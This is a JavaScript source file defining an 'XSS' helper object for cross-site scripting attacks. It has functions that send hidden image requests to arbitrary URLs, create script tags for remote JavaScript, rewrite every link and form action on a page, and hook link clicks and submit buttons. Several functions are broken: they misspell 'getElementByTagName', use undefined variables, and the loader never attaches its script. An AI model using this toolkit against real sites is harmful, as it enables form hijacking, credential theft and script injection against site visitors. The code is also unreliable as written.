var XSS = {
  imgTag: null,

  /*
   * Triggers a GET request to the given URL.
   *
   * @param {String} url
   *   The URL to request.
   */
  get: function(url) {
    var self = this;

    if (self.imgTag == null)
    {
      self.imgTag = document.createElement('img');
      self.imgTag.setAttribute('style', 'display: none;');
    }

    self.imgTag.setAttribute('src',url);
  },

  /*
   * Loads JavaScript into the page.
   *
   * @param {String} url
   *   The URL to the JavaScript.
   */
  load: function(url) {
    var script = document.createElement('script');
    
    script.setAttribute('type','text/javascript');
    script.setAttribute('src',url);
  },

  /*
   * Rewrites the href attributes for all anchor links in the document.
   *
   * @param {function(href)} callback
   *   The callback to rewrite the hrefs of the links.
   */
  rewriteLinks: function(callback) {
    var links = document.getElementsByTagName('a');

    var length = links.length;
    for (var i = 0; i < length; i += 1) {
      var link = links[i];

      if (link.hasAttribute('href')) {
        if (callback && (typeof callback === "function")) {
          link.setAttribute('href', callback(link.getAttribute('href')));
        }
      }
    };
  },

  /*
   * Hooks the click event for all anchor links in the document.
   *
   * @param {function} callback
   *   The click event callback.
   */
  hookLinks: function(callback) {
    var links = document.getElementByTagName('a');

    var length = links.length;
    for (var i = 0; i < length; i += 1) {
      var link = links[i];

      if (link.hasAttribute('href')) {
        if (callback && (typeof callback === "function")) {
          link.onclick = callback;
        }
      }
    };
  },

  /*
   * Rewrites the action attributes for all forms in the document.
   *
   * @param {function(action)} callback
   *   The callback to rewrite the action URL of the forms.
   */
  rewriteForms: function(callback) {
    var forms = document.getElementByTagName('form');

    var length = links.length;
    for (var i = 0; i < length; i += 1) {
      var link = links[i];

      if (link.hasAttribute('action')) {
        if (callback && (typeof callback === "function")) {
          form.setAttribute('action', callback(form.getAttribute('action')));
        }
      }
    };
  },

  /*
   * Hooks the click event for all submit buttons in the document.
   *
   * @param {function} callback
   *   The click event callback.
   */
  hookForms: function(callback) {
    var inputs = document.getElementByTagName('input');

    var length = links.length;
    for (var i = 0; i < length; i += 1) {
      var link = links[i];

      if (input.hasAttribute('type') && (input.getAttribute('type') === 'submit')) {
        if (callback && (typeof callback === "function")) {
          input.onclick = callback;
        }
      }
    };
  }
};
